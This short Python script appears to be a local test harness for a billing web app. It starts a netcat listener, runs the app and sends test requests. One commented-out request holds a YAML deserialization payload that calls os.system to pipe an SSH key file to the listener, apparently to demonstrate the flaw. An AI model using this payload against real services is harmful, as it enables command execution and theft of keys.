import subprocess
import requests
import app
import threading


URL = "http://localhost:7354/request-bill"

threading.Thread(target=subprocess.call, kwargs={'args':'nc -l 7777', 'shell':True}).start()
thread = threading.Thread(target=app.start_app)
thread.start()

# PARAMS = {'log-level': '!!python/object/apply:os.system [cat /Users/d062794/ssh.pub | nc 127.0.0.1 7777]'}
# r = requests.get(url = URL, params = PARAMS)

# PARAMS = {'log-level': 'DEBUG'}
# r = requests.get(url = URL, params = PARAMS)

# PARAMS = {'name': 'somebody', 'item': 'delicious-stuff'}
# r = requests.get(url = URL, params = PARAMS)

PARAMS = {'name': 'somebody'}
r = requests.get(url = URL, params = PARAMS)
if r.status_code == 200:
    print("Test successful")
    print(r.text)
